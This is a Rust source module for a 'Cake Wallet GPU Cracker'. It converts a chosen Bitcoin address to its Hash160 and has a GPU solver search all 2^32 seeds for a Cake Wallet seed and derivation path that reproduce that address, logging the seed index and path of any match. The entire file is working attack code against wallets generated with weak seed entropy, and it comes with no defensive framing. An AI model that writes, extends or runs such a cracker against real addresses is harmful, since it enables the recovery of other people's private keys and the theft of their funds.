//! Cake Wallet GPU Cracker
//!
//! This module requires GPU acceleration. Compile with `--features gpu`

#[cfg(not(feature = "gpu"))]
pub fn run_crack(_target_address: &str) -> anyhow::Result<()> {
    anyhow::bail!("This scanner requires GPU acceleration. Please recompile with --features gpu")
}

#[cfg(feature = "gpu")]
pub fn run_crack(target_address: &str) -> anyhow::Result<()> {
    use crate::scans::gpu_solver::GpuSolver;
    use tracing::{info, warn};

    info!("Cake Wallet GPU Cracker");
    info!("Target: {}", target_address);

    // Parse target address to Hash160
    let target_h160 = if target_address.starts_with("bc1q") {
        use bitcoin::Address;
        use std::str::FromStr;
        let addr = Address::from_str(target_address)?.require_network(bitcoin::Network::Bitcoin)?;
        let witness_program = addr
            .witness_program()
            .ok_or_else(|| anyhow::anyhow!("Not a witness address"))?;
        let prog = witness_program.program();
        if prog.len() != 20 {
            anyhow::bail!("Witness program must be 20 bytes for P2WPKH");
        }
        let mut h160 = [0u8; 20];
        h160.copy_from_slice(prog.as_bytes());
        h160
    } else {
        let bytes = bs58::decode(target_address).into_vec()?;
        if bytes.len() != 25 {
            anyhow::bail!("Invalid address length");
        }
        let h160: [u8; 20] = bytes[1..21].try_into()?;
        h160
    };

    info!("Target Hash160: {}", hex::encode(target_h160));
    info!("Initializing GPU Solver...");

    let solver = GpuSolver::new()?;
    let total_seeds = 0xFFFFFFFFu32;
    let batch_size = 1 << 24;

    info!("Starting scan of 2^32 seeds...");

    let mut found = false;
    let mut offset = 0u32;

    while offset < total_seeds {
        let count = std::cmp::min(batch_size, total_seeds - offset);

        let hits = solver.compute_cake_wallet_crack(offset, count, &target_h160)?;

        for (seed_idx, change, addr_idx) in hits {
            found = true;
            warn!("!!! FOUND MATCH !!!");
            warn!("Seed Index: {}", seed_idx);
            warn!("Path: m/0'/{}/{}", change, addr_idx);
        }

        offset += count;
        if offset % (batch_size * 4) == 0 {
            info!(
                "Progress: {:.1}%",
                (offset as f64 / total_seeds as f64) * 100.0
            );
        }

        if offset >= total_seeds {
            break;
        }
    }

    if !found {
        info!("No match found in 32-bit keyspace.");
    }

    Ok(())
}
